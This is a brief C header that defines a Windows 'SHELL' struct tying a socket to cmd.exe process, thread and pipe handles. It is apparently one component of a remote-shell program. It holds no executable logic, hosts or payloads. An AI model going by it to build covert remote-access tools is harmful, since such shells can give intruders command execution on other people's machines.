#ifndef REMOTE_SHELL_H_INCLUDED
#define REMOTE_SHELL_H_INCLUDED

typedef struct _SHELL
{
    SOCKET socket;               // Socket of the shell
    CRITICAL_SECTION cs;         // Critical Section for accessing the socket simultaneously

    HANDLE hStdoutPipe;          // STDOUT shell pipe- output pipe
    HANDLE hStdinPipe;           // STDIN shell pipe - input pipe

    HANDLE hProcess;             // CMD
    HANDLE hProcessThread;       // CMD Main Thread

	HANDLE pHStdout;			 // CMD STDOUT
	HANDLE pHStdin;				 // CMD STDIN

    HANDLE hStdoutThread;        // Read - STDOUT shell thread
    HANDLE hStdinThread;         // Write - STDIN shell thread

} SHELL, *PSHELL;

#endif // REMOTE_SHELL_H_INCLUDED
